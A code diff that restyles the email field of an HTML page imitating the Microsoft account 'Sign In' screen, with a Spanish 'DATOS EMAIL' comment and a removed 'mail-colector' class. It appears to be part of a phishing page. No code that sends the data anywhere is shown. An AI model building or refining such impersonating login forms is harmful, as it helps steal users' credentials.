@@ -27,10 +27,13 @@
 						<h4 class="card-title font-weight-normal text-black">Sign In</h4>
 
 						<!-- DATOS EMAIL -->
-						<div class="md-form mb-2">
-							<label for="email" class="small">Email, phone, or Skype</label>
-                            <input type="email" name="email" id="correo" class="form-control mail-colector" required>            
-                        </div>
+	                    <div class="wrapper mb-2 mt-4">
+	                        <div class="input-data">
+                            	<input type="email" name="email" id="correo" required>
+	                            <div class="underline"></div>
+	                            <label for="email">Email, phone, or Skype</label>
+	                        </div>
+	                    </div>
 
 						   <p class="card-text mb-2">No account? <a href="https://signup.live.com/?wa=wsignin1.0&rpsnv=13&ct=1589150126&rver=7.0.6738.0&wp=MBI_SSL&wreply=https:%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin%3Fru%3Dhttps%253A%252F%252Faccount.microsoft.com%252F%253Frefp%253Dsignedout-index%2526refd%253Dwww.google.com&id=292666&lw=1&fl=easi2&contextid=B6B4CFFE7B54C130&bk=1589150130&uiflavor=web&lic=1&mkt=EN-US&lc=1033&uaid=6f22839701c643616da0c2d4f395b28a">Create One!</a></p>
 						   <p class="card-text mb-2"><a href="#">Sign-in options</a></p>		
